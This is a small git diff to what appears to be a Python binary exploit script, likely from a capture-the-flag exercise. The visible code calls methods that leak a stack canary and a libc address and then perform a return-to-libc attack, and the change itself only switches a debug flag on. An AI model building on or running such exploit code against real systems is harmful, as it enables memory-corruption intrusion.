@@ -76,4 +76,4 @@ class Exploit:
             canary, libc_address = self.get_canary_and_libc(r)
             self.return_to_libc(r, canary, libc_address)
 
-Exploit(local=True, debug=False).start()
+Exploit(local=True, debug=True).start()
